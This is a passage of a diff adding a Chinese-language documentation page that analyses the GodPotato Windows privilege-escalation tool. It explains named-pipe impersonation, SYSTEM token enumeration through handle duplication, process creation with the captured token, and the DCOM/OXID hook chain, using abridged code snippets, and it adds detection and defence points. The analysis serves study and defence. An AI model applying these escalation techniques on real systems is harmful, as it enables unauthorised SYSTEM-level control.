+<a id="__codelineno-5-30" name="__codelineno-5-30"></a><span class="w">        </span><span class="p">});</span>
+<a id="__codelineno-5-31" name="__codelineno-5-31"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-5-32" name="__codelineno-5-32"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>技术细节</strong>:
+1. 管道路径: <code>\\.\pipe\GodPotato\pipe\epmapper</code>（服务端），对应客户端路径<code>ncacn_np:localhost/pipe/GodPotato[\pipe\epmapper]</code>（见<a href="GodPotato/NativeAPI/GodPotatoContext.cs:34"><code>GodPotatoContext.cs:34-35</code></a>）
+2. 安全描述符: <code>D:(A;OICI;GA;;;WD)</code> - 允许所有人(Everyone)完全访问(GA)、对象继承(OICI)
+3. 使用<code>ImpersonateNamedPipeClient</code>模拟连接的客户端
+4. 遍历进程令牌查找SYSTEM令牌(S-1-5-18)</p>
+<p><strong>微软官方文档说明</strong>:
+根据<a href="https://learn.microsoft.com/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient">ImpersonateNamedPipeClient函数文档</a>:
+- 该函数允许命名管道服务器端模拟客户端
+- 调用后，管道文件系统将调用线程改为模拟客户端的安全上下文
+- 模拟成功需要SeImpersonatePrivilege权限</p>
+<hr />
+<h3 id="5">功能5: 令牌搜索与提升</h3>
+<h4 id="_11">功能目的</h4>
+<p>在获取初始模拟令牌后，遍历系统进程查找更高权限的SYSTEM令牌，实现完整的权限提升。</p>
+<h4 id="_12">实现方式</h4>
+<p><strong>代码位置</strong>: <a href="GodPotato/SharpToken.cs:1-500"><code>SharpToken.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-6-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-6-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-6-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-6-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-6-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-6-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-6-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-6-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-6-10">10</a></span>
+<span class="normal"><a href="#__codelineno-6-11">11</a></span>
+<span class="normal"><a href="#__codelineno-6-12">12</a></span>
+<span class="normal"><a href="#__codelineno-6-13">13</a></span>
+<span class="normal"><a href="#__codelineno-6-14">14</a></span>
+<span class="normal"><a href="#__codelineno-6-15">15</a></span>
+<span class="normal"><a href="#__codelineno-6-16">16</a></span>
+<span class="normal"><a href="#__codelineno-6-17">17</a></span>
+<span class="normal"><a href="#__codelineno-6-18">18</a></span>
+<span class="normal"><a href="#__codelineno-6-19">19</a></span>
+<span class="normal"><a href="#__codelineno-6-20">20</a></span>
+<span class="normal"><a href="#__codelineno-6-21">21</a></span>
+<span class="normal"><a href="#__codelineno-6-22">22</a></span>
+<span class="normal"><a href="#__codelineno-6-23">23</a></span>
+<span class="normal"><a href="#__codelineno-6-24">24</a></span>
+<span class="normal"><a href="#__codelineno-6-25">25</a></span>
+<span class="normal"><a href="#__codelineno-6-26">26</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1"></a><span class="k">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="k">void</span><span class="w"> </span><span class="nf">ListProcessTokens</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">targetProcessId</span><span class="p">,</span><span class="w"> </span><span class="n">Func</span><span class="o">&lt;</span><span class="n">ProcessTokenInfo</span><span class="p">,</span><span class="w"> </span><span class="kt">bool</span><span class="o">&gt;</span><span class="w"> </span><span class="n">callback</span><span class="p">)</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2"></a><span class="p">{</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3"></a><span class="w">    </span><span class="c1">// 使用NtQuerySystemInformation获取系统句柄信息</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4"></a><span class="w">    </span><span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemExtendedHandleInformation</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5"></a>
+<a id="__codelineno-6-6" name="__codelineno-6-6"></a><span class="w">    </span><span class="c1">// 遍历所有句柄</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7"></a><span class="w">    </span><span class="k">foreach</span><span class="w"> </span><span class="p">(</span><span class="kt">var</span><span class="w"> </span><span class="n">handleInfo</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">handleInfos</span><span class="p">)</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8"></a><span class="w">    </span><span class="p">{</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9"></a><span class="w">        </span><span class="c1">// 复制句柄到当前进程</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10"></a><span class="w">        </span><span class="n">NtDuplicateObject</span><span class="p">(</span><span class="n">sourceProcess</span><span class="p">,</span><span class="w"> </span><span class="n">handle</span><span class="p">,</span><span class="w"> </span><span class="n">currentProcess</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<a id="__codelineno-6-11" name="__codelineno-6-11"></a>
+<a id="__codelineno-6-12" name="__codelineno-6-12"></a><span class="w">        </span><span class="c1">// 查询对象类型</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13"></a><span class="w">        </span><span class="n">NtQueryObject</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">ObjectTypeInformation</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14"></a>
+<a id="__codelineno-6-15" name="__codelineno-6-15"></a><span class="w">        </span><span class="c1">// 如果是令牌对象</span>
+<a id="__codelineno-6-16" name="__codelineno-6-16"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">typeName</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&quot;Token&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17"></a><span class="w">        </span><span class="p">{</span>
+<a id="__codelineno-6-18" name="__codelineno-6-18"></a><span class="w">            </span><span class="c1">// 获取令牌信息</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19"></a><span class="w">            </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenUser</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20"></a><span class="w">            </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenIntegrityLevel</span><span class="p">,</span><span class="w"> </span><span class="p">...);</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21"></a>
+<a id="__codelineno-6-22" name="__codelineno-6-22"></a><span class="w">            </span><span class="c1">// 调用回调函数处理令牌</span>
+<a id="__codelineno-6-23" name="__codelineno-6-23"></a><span class="w">            </span><span class="n">callback</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ProcessTokenInfo</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">});</span>
+<a id="__codelineno-6-24" name="__codelineno-6-24"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>技术细节</strong>:
+1. 使用<code>NtQuerySystemInformation</code>获取系统所有句柄
+2. 使用<code>NtDuplicateObject</code>复制其他进程的句柄
+3. 使用<code>NtQueryObject</code>判断句柄类型
+4. 使用<code>GetTokenInformation</code>获取令牌详细信息
+5. 筛选条件: SID为S-1-5-18(SYSTEM)、模拟级别&gt;=Impersonation、完整性级别&gt;=SystemIntegrity</p>
+<hr />
+<h3 id="6">功能6: 高权限进程创建</h3>
+<h4 id="_13">功能目的</h4>
+<p>使用获取的SYSTEM令牌创建新进程，执行攻击者指定的命令。</p>
+<h4 id="_14">实现方式</h4>
+<p><strong>代码位置</strong>: <a href="GodPotato/SharpToken.cs:463-466"><code>SharpToken.cs</code></a></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span>
+<span class="normal"><a href="#__codelineno-7-2">2</a></span>
+<span class="normal"><a href="#__codelineno-7-3">3</a></span>
+<span class="normal"><a href="#__codelineno-7-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="k">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="nf">CreateProcessWithTokenW</span><span class="p">(</span><span class="n">IntPtr</span><span class="w"> </span><span class="n">hToken</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="n">dwLogonFlags</span><span class="p">,</span><span class="w"> </span>
+<a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="w">    </span><span class="kt">string</span><span class="w"> </span><span class="n">lpApplicationName</span><span class="p">,</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="n">lpCommandLine</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="n">dwCreationFlags</span><span class="p">,</span><span class="w"> </span>
+<a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">lpEnvironment</span><span class="p">,</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="n">lpCurrentDirectory</span><span class="p">,</span><span class="w"> </span>
+<a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w">    </span><span class="k">ref</span><span class="w"> </span><span class="n">STARTUPINFO</span><span class="w"> </span><span class="n">lpStartupInfo</span><span class="p">,</span><span class="w"> </span><span class="k">out</span><span class="w"> </span><span class="n">PROCESS_INFORMATION</span><span class="w"> </span><span class="n">lpProcessInformation</span><span class="p">);</span>
+</code></pre></div></td></tr></table></div>
+<p><strong>调用示例</strong>:
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="n">TokenuUils</span><span class="p">.</span><span class="n">createProcessReadOut</span><span class="p">(</span><span class="n">ConsoleWriter</span><span class="p">,</span><span class="w"> </span><span class="n">systemIdentity</span><span class="p">.</span><span class="n">Token</span><span class="p">,</span><span class="w"> </span><span class="n">potatoArgs</span><span class="p">.</span><span class="n">cmd</span><span class="p">);</span>
+</code></pre></div></td></tr></table></div></p>
+<p><strong>技术细节</strong>:
+- 使用<code>CreateProcessWithTokenW</code>或<code>CreateProcessAsUserW</code>
+- 创建标志包含<code>CREATE_NO_WINDOW</code>避免弹出窗口
+- 通过管道重定向输出进行结果读取</p>
+<hr />
+<h2 id="_15">功能组合使用分析</h2>
+<h3 id="_16">组合流程</h3>
+<p>GodPotato的各个功能按照以下顺序组合使用:</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-9-10">10</a></span>
+<span class="normal"><a href="#__codelineno-9-11">11</a></span>
+<span class="normal"><a href="#__codelineno-9-12">12</a></span>
+<span class="normal"><a href="#__codelineno-9-13">13</a></span>
+<span class="normal"><a href="#__codelineno-9-14">14</a></span>
+<span class="normal"><a href="#__codelineno-9-15">15</a></span>
+<span class="normal"><a href="#__codelineno-9-16">16</a></span>
+<span class="normal"><a href="#__codelineno-9-17">17</a></span>
+<span class="normal"><a href="#__codelineno-9-18">18</a></span>
+<span class="normal"><a href="#__codelineno-9-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a>1. 初始化并Hook RPC运行时库 (功能1)
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a>   ↓
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a>2. 启动命名管道服务器 (功能4)
+<a id="__codelineno-9-4" name="__codelineno-9-4"></a>   ↓
+<a id="__codelineno-9-5" name="__codelineno-9-5"></a>3. 构造恶意OBJREF (功能3)
+<a id="__codelineno-9-6" name="__codelineno-9-6"></a>   ↓
+<a id="__codelineno-9-7" name="__codelineno-9-7"></a>4. 调用CoUnmarshalInterface触发OXID解析
+<a id="__codelineno-9-8" name="__codelineno-9-8"></a>   ↓
+<a id="__codelineno-9-9" name="__codelineno-9-9"></a>[RPCSS服务解析OBJREF，调用被Hook的函数]
+<a id="__codelineno-9-10" name="__codelineno-9-10"></a>   ↓
+<a id="__codelineno-9-11" name="__codelineno-9-11"></a>5. 自定义RPC端点解析返回攻击者管道路径 (功能2)
+<a id="__codelineno-9-12" name="__codelineno-9-12"></a>   ↓
+<a id="__codelineno-9-13" name="__codelineno-9-13"></a>[RPCSS服务连接到攻击者的命名管道]
+<a id="__codelineno-9-14" name="__codelineno-9-14"></a>   ↓
+<a id="__codelineno-9-15" name="__codelineno-9-15"></a>6. 模拟管道客户端获取令牌 (功能4)
+<a id="__codelineno-9-16" name="__codelineno-9-16"></a>   ↓
+<a id="__codelineno-9-17" name="__codelineno-9-17"></a>7. 搜索SYSTEM令牌 (功能5)
+<a id="__codelineno-9-18" name="__codelineno-9-18"></a>   ↓
+<a id="__codelineno-9-19" name="__codelineno-9-19"></a>8. 使用SYSTEM令牌创建进程 (功能6)
+</code></pre></div></td></tr></table></div>
+<h3 id="_17">组合目的</h3>
+<p>这种组合利用了DCOM/OXID解析机制的信任关系:</p>
+<ol>
+<li><strong>Hook机制</strong>: 通过修改combase.dll中的分发表，控制RPC端点解析过程</li>
+<li><strong>OXID解析漏洞</strong>: RPCSS服务在解析OBJREF时会调用被Hook的函数获取绑定信息</li>
+<li><strong>路径重定向</strong>: 自定义函数返回攻击者的命名管道路径，而非真实路径</li>
+<li><strong>权限传递</strong>: RPCSS服务以高权限运行，连接管道时携带高权限令牌</li>
+<li><strong>令牌提升</strong>: 通过遍历进程令牌获取完整的SYSTEM令牌</li>
+</ol>
+<hr />
+<h2 id="_18">技术学习要点</h2>
+<h3 id="1-dcomoxid">1. DCOM/OXID解析机制</h3>
+<p><strong>学习内容</strong>:
+- OXID(Object Exporter ID)的作用和解析过程
+- OBJREF结构和序列化格式
+- DualStringArray绑定信息构造
+- RPCSS服务在DCOM中的角色</p>
+<p><strong>关键概念</strong>:
+- <strong>OXID</strong>: 对象导出器标识符，用于定位DCOM对象所在进程
+- <strong>OID</strong>: 对象标识符，标识特定对象实例
+- <strong>IPID</strong>: 接口指针标识符，标识对象的特定接口
+- <strong>StringBinding</strong>: 协议序列和网络地址的组合</p>
+<h3 id="2-rpc_1">2. RPC运行时库内部结构</h3>
+<p><strong>学习内容</strong>:
+- RPC_SERVER_INTERFACE结构
+- MIDL_SERVER_INFO结构
+- RPC分发表(Dispatch Table)机制
+- 内存保护和代码注入技术</p>
+<p><strong>关键结构</strong>:
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-10-10">10</a></span>
+<span class="normal"><a href="#__codelineno-10-11">11</a></span>
+<span class="normal"><a href="#__codelineno-10-12">12</a></span>
+<span class="normal"><a href="#__codelineno-10-13">13</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="n">RPC_SERVER_INTERFACE</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="n">Length</span><span class="p">;</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="w">    </span><span class="n">RPC_SYNTAX_IDENTIFIER</span><span class="w"> </span><span class="n">InterfaceId</span><span class="p">;</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="w">    </span><span class="n">RPC_SYNTAX_IDENTIFIER</span><span class="w"> </span><span class="n">TransferSyntax</span><span class="p">;</span>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">DispatchTable</span><span class="p">;</span><span class="w">      </span><span class="c1">// 关键：分发表指针</span>
+<a id="__codelineno-10-6" name="__codelineno-10-6"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">InterpreterInfo</span><span class="p">;</span><span class="w">    </span><span class="c1">// MIDL_SERVER_INFO指针</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="p">}</span>
+<a id="__codelineno-10-8" name="__codelineno-10-8"></a>
+<a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="n">MIDL_SERVER_INFO</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-10-10" name="__codelineno-10-10"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">DispatchTable</span><span class="p">;</span><span class="w">      </span><span class="c1">// 函数指针数组</span>
+<a id="__codelineno-10-11" name="__codelineno-10-11"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">ProcString</span><span class="p">;</span><span class="w">         </span><span class="c1">// 过程格式字符串</span>
+<a id="__codelineno-10-12" name="__codelineno-10-12"></a><span class="w">    </span><span class="n">IntPtr</span><span class="w"> </span><span class="n">FmtStringOffset</span><span class="p">;</span><span class="w">    </span><span class="c1">// 格式字符串偏移表</span>
+<a id="__codelineno-10-13" name="__codelineno-10-13"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div></p>
+<h3 id="3-windows">3. Windows令牌体系</h3>
+<p><strong>学习内容</strong>:
+- 主令牌与模拟令牌的区别
+- 令牌完整性级别(Integrity Level)
+- 令牌模拟级别(Impersonation Level)
+- 特权(Privilege)和访问权限</p>
+<p><strong>完整性级别</strong>:
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">3</a></span>
+<span class="normal"><a href="#__codelineno-11-4">4</a></span>
+<span class="normal"><a href="#__codelineno-11-5">5</a></span>
+<span class="normal"><a href="#__codelineno-11-6">6</a></span>
+<span class="normal"><a href="#__codelineno-11-7">7</a></span>
+<span class="normal"><a href="#__codelineno-11-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="n">IntegrityLevel</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="w">    </span><span class="n">Untrusted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00000000</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="w">    </span><span class="n">LowIntegrity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00001000</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="w">    </span><span class="n">MediumIntegrity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00002000</span>
+<a id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="w">    </span><span class="n">HighIntegrity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00003000</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="w">    </span><span class="n">SystemIntegrity</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00004000</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="w">    </span><span class="n">ProtectedProcess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00005000</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="p">}</span>
+</code></pre></div></td></tr></table></div></p>
+<h3 id="4_1">4. 系统句柄枚举技术</h3>
+<p><strong>学习内容</strong>:
+- NtQuerySystemInformation API使用
+- 系统句柄信息结构
+- 跨进程句柄复制
+- 对象类型查询</p>
+<p><strong>关键API</strong>:
+- <code>NtQuerySystemInformation</code>: 获取系统信息(包括所有句柄)
+- <code>NtDuplicateObject</code>: 复制其他进程的句柄
+- <code>NtQueryObject</code>: 查询对象类型和名称
+- <code>GetTokenInformation</code>: 获取令牌详细信息</p>
+<h3 id="5-commoniker">5. COM/Moniker编程</h3>
+<p><strong>学习内容</strong>:
+- IMoniker接口和对象引用
+- CreateObjrefMoniker函数
+- OBJREF Base64编码格式
+- CoUnmarshalInterface调用流程</p>
+<p><strong>关键API</strong>:
+- <code>CreateBindCtx</code>: 创建绑定上下文
+- <code>CreateObjrefMoniker</code>: 创建对象引用Moniker
+- <code>CoUnmarshalInterface</code>: 解组接口指针</p>
+<h3 id="6_1">6. 攻击检测与防御</h3>
+<p><strong>检测要点</strong>:
+- combase.dll内存修改检测
+- 异常的RPC分发表修改
+- OBJREF结构异常检测
+- 命名管道路径异常监控</p>
+<p><strong>防御措施</strong>:
+- 实施代码完整性保护
+- 监控关键DLL内存修改
+- 限制SeImpersonatePrivilege权限
+- 部署EDR监控敏感API调用</p>
+<hr />
+<h2 id="potato">与其他Potato技术的对比</h2>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>GodPotato</th>
+<th>BadPotato/PrintSpoofer</th>
+<th>JuicyPotato</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>触发机制</td>
+<td>DCOM OXID解析Hook</td>
+<td>Print Spooler RPC</td>
+<td>DCOM激活请求</td>
+</tr>
+<tr>
+<td>目标服务</td>
+<td>RPCSS</td>
+<td>Print Spooler</td>
+<td>多种DCOM服务</td>
+</tr>
+<tr>
+<td>适用系统</td>
+<td>Win2012-Win2019</td>
+<td>Win2012-Win2019</td>
+<td>Win2008-Win2016</td>
+</tr>
+<tr>
+<td>权限要求</td>
+<td>SeImpersonatePrivilege</td>
+<td>SeImpersonatePrivilege</td>
+<td>SeImpersonatePrivilege</td>
+</tr>
+<tr>
+<td>技术复杂度</td>
+<td>高(需要Hook)</td>
+<td>中</td>
+<td>中</td>
+</tr>
+<tr>
+<td>稳定性</td>
+<td>较高</td>
+<td>较高</td>
+<td>较低</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_19">总结</h2>
+<p>GodPotato项目展示了Windows DCOM机制的深层安全风险。通过Hook RPC运行时库的核心函数，攻击者可以控制OXID解析过程，诱导高权限服务连接到可控资源，进而获取SYSTEM权限。</p>
+<p>该技术的创新点在于:
+1. 直接Hook系统DLL而非依赖特定服务行为
+2. 利用DCOM基础设施的信任关系
+3. 结合令牌枚举实现完整权限提升</p>
+<p>理解GodPotato的原理对于深入理解Windows DCOM架构和安全边界具有重要意义。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../../..", "features": ["navigation.top", "search.suggest", "search.highlight", "content.code.copy", "content.code.select", "content.code.annotate"], "search": "../../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../../config/stylesheets/javascripts/cyber-buddha.js"></script>
+      
+    
+  </body>
+</html>
